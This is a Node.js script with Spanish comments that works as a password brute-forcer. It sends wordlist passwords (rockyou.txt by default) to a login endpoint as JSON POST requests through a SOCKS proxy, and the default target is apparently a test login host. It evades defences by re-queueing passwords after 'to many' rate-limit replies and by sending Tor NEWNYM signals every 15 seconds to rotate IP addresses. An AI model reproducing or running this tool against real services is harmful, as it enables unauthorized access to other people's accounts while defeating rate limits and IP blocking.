#!/usr/bin/env node



 //-------------importaciones--------------

import yargs from 'yargs'

import {hideBin} from 'yargs/helpers'

import fs from 'fs'

import { SocksProxyAgent } from 'socks-proxy-agent'
import axios from 'axios'

import net from 'net'
import dns from 'dns/promises'



    

//-------------declaración de variables--------------------

let control_ports=["9053","9055","9057","9059","9061"]


const agent = new SocksProxyAgent('socks5://127.0.0.1:16379')



//subrama1: yargs:



const yarg= yargs(hideBin(process.argv))

.option("url",{demandOption:false,type:"string"}).option("n",{type:"number",demandOption:false, default:5}).

option("header",{type:"string",default:"application/json"})

.option("body",{type:"string"})

.option("method",{type:"string"})

.option("wordlist",{type:"string",default:"/usr/share/wordlists/rockyou.txt"})

.option("error",{type:"string",default:"error"})
.options("proxies",{type:"number",default:5}).parseSync()



let url= yarg.url || "https://login-de-pruebas-1.onrender.com/login"

const objURL= new URL(url)

const ip= await dns.lookup(objURL.hostname)

let urlfinal= `https://${ip.address}${objURL.pathname}` //NO borrar esta linea, se está haciendo una resolución de dns al principio para que axios no lo haga en cada petición (termina saturado)



let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")



let body=JSON.parse(yarg.body)
    


let num_de_peticiones=0



let promesas=[]





let header=yarg.header

let contraseña_encontrada=false

let a=0



// for(let contra of wordlist){

//     if(contra==="password123"){console.log("contraseña encontrada, indice:",a)}

//     ++a

// }



//declaracion de funciones



async function worker(){let i=0; 

    

    while(i<yarg.n){try{let contraseña= wordlist.shift(); const keys = Object.keys(body);
body[keys[1]] = contraseña; 

       

            axios.post(urlfinal,body,{httpAgent:agent,httpsAgent:agent,headers:{"Content-Type":header,'Host':objURL.hostname}})

     .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})

       

     

    }catch(error){console.log("error:",error)}

        ++i;

    }

}



//-----------codigo-------------






  


    

   let ID2= setInterval(async () => {if(contraseña_encontrada===true){clearInterval(ID2); process.exit()}
    let a=0
    while(a<5){++a; worker()}



    

    }, 5000);


    let ID1= setInterval(() => {
        for (let ports of control_ports){
            const socket= net.connect(ports,"127.0.0.1")

            socket.on('connect', () => {
            socket.write('AUTHENTICATE ""\r\n');
            
            socket.on('data', (data) => {
                const response = data.toString();
                if (response.includes('250')) {
                    socket.write('SIGNAL NEWNYM\r\n');
                    
                    socket.on('data', (data2) => {
                        if (data2.toString().includes('250')) {
                            socket.destroy();
                        }
                    });
                }
            });
        });
        }
    }, 15000);

       
